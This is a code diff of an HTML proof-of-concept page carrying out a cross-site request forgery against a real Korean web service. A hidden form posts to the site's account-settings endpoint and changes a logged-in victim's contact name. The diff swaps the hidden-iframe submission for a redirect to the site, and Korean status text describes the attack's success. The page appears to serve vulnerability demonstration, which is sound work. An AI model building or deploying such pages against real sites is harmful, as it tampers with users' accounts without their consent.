@@ -284,11 +284,8 @@ ncnm=%EC%A0%84%EC%9C%A0%EC%A7%84</div>
             </ol>
         </div>
 
-        <!-- Hidden iframe for form submission -->
-        <iframe name="csrfFrame" style="display:none;"></iframe>
-
         <!-- Hidden CSRF Form -->
-        <form id="csrfForm" method="POST" action="https://cyberts.kr/vtsp/mbe/emplyr/mypage/save.do" target="csrfFrame" style="display:none;">
+        <form id="csrfForm" method="POST" action="https://cyberts.kr/vtsp/mbe/emplyr/mypage/save.do" style="display:none;">
             <input type="text" name="ncnm" id="formName" value="">
         </form>
     </div>
@@ -310,25 +307,15 @@ ncnm=%EC%A0%84%EC%9C%A0%EC%A7%84</div>
 
             formName.value = name;
 
-            status.className = 'status show';
-            status.style.background = '#fff3cd';
-            status.style.color = '#856404';
-            status.style.border = '1px solid #ffc107';
-            status.innerHTML = '⏳ CSRF 공격 전송 중...';
+            status.className = 'status show success';
+            status.innerHTML = '✅ CSRF 공격이 전송됩니다!<br><br>' +
+                              '<strong>다음 단계:</strong><br>' +
+                              '1. cyberts.kr 기업회원 마이페이지로 리다이렉트됩니다<br>' +
+                              '2. 담당자명이 "' + name + '"으로 변경되었는지 확인하세요<br>' +
+                              '3. 변경되었다면 CSRF 취약점 증명 완료!';
 
-            // iframe으로 form submit (페이지 이동 없음, 쿠키 자동 포함)
+            // form submit (페이지가 cyberts.kr로 리다이렉트됨)
             form.submit();
-
-            // 1초 후 성공 메시지 표시
-            setTimeout(() => {
-                status.className = 'status show success';
-                status.innerHTML = '✅ CSRF 공격이 전송되었습니다!<br><br>' +
-                                  '<strong>결과:</strong><br>' +
-                                  '담당자명 "' + name + '"으로 변경 요청이 전송되었습니다.<br>' +
-                                  '브라우저가 자동으로 세션 쿠키를 포함했습니다.<br><br>' +
-                                  '<strong>이것이 바로 CSRF 취약점입니다!</strong><br><br>' +
-                                  '<a href="https://cyberts.kr/vtsp/mbe/emplyr/mypage/saveView.do" target="_blank" style="color: #155724; font-weight: 600; text-decoration: none; border: 2px solid #155724; padding: 8px 16px; border-radius: 6px; display: inline-block; margin-top: 10px;">📋 마이페이지에서 변경 확인하기 →</a>';
-            }, 1000);
         }
 
         function togglePacket() {
